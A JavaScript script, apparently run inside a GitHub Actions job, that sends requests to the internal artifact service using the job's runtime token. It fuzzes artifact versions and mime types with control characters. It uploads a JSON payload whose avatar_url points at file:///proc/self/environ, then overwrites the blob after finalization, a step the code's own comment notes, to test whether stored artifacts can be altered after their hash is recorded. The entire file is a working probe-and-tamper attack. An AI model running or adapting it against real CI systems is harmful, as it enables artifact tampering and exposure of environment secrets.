import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const endpoint = new URL('/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', process.env.ACTIONS_RESULTS_URL);
const token = process.env.ACTIONS_RUNTIME_TOKEN;
const client = internalArtifactTwirpClient({maxAttempts: 1});
const oddMime = 'application/json\u0085';
const body = Buffer.from(JSON.stringify({
  full_name: 'pwn/repo',
  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
  description: 'Repo Cassette carrier',
  stargazers_count: 0,
}));
const digest = createHash('sha256').update(body).digest('hex');

async function create(name, version, mime = oddMime) {
  const response = await fetch(endpoint, {
    method: 'POST',
    headers: {authorization: `Bearer ${token}`, 'content-type': 'application/json'},
    body: JSON.stringify({
      workflow_run_backend_id: ids.workflowRunBackendId,
      workflow_job_run_backend_id: ids.workflowJobRunBackendId,
      name,
      version,
      mime_type: mime,
    }),
  });
  const text = await response.text();
  let value = {};
  try { value = JSON.parse(text); } catch {}
  return {
    status: response.status,
    text: text.slice(0, 220),
    url: value.signed_upload_url || value.signedUploadUrl,
  };
}

async function run(label, version, mime) {
  const name = `${process.env.GITHUB_RUN_ID}-version-${label}`;
  const result = {label, versionJson: JSON.stringify(version), name};
  try {
    const made = await create(name, version, mime);
    result.createStatus = made.status;
    result.createText = made.text;
    if (!made.url) return result;
    const blob = new BlobClient(made.url).getBlockBlobClient();
    await blob.uploadData(body, {blobHTTPHeaders: {blobContentType: oddMime}});
    const finalized = await client.FinalizeArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
      size: String(body.length),
      hash: StringValue.create({value: `sha256:${digest}`}),
    });
    result.artifactId = String(finalized.artifactId);
    // Blob metadata remains writable after finalization.
    await blob.uploadData(body, {blobHTTPHeaders: {blobContentType: oddMime}});
    const signed = await client.GetSignedArtifactURL({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    const url = new URL(signed.signedUrl);
    result.rsct = url.searchParams.get('rsct');
    const response = await fetch(url);
    result.downloadStatus = response.status;
    result.ctHex = Buffer.from(response.headers.get('content-type') || '', 'latin1').toString('hex');
    const bytes = Buffer.from(await response.arrayBuffer());
    result.bytes = bytes.length;
    result.sha = createHash('sha256').update(bytes).digest('hex');
  } catch (error) {
    result.error = String(error).slice(0, 300);
  }
  return result;
}

const cases = [
  ['min', -2147483648], ['neg100', -100], ['neg1', -1], ['zero', 0],
  ['one', 1], ['four', 4], ['five', 5], ['six', 6], ['seven', 7],
  ['eight', 8], ['nine', 9], ['ten', 10], ['fortytwo', 42],
  ['max', 2147483647], ['str6', '6'], ['str7', '7'], ['str8', '8'],
  ['str07', '07'], ['strplus7', '+7'], ['strfloat7', '7.0'],
  ['strexp7', '7e0'], ['float69', 6.9], ['float71', 7.1],
  ['null', null], ['false', false],
  ['v7-control', 7, 'application/json'],
  ['v8-control', 8, 'application/json'],
  ['fs-suffix', 7, 'application/json\u001c'],
  ['gs-suffix', 7, 'application/json\u001d'],
  ['rs-suffix', 7, 'application/json\u001e'],
  ['us-suffix', 7, 'application/json\u001f'],
  ['fs-prefix', 7, '\u001capplication/json'],
  ['gs-prefix', 7, '\u001dapplication/json'],
  ['rs-prefix', 7, '\u001eapplication/json'],
  ['us-prefix', 7, '\u001fapplication/json'],
];

for (let i = 0; i < cases.length; i += 6) {
  const rows = await Promise.all(cases.slice(i, i + 6).map(x => run(...x)));
  for (const row of rows) console.log(`VERSION_RESULT ${JSON.stringify(row)}`);
}
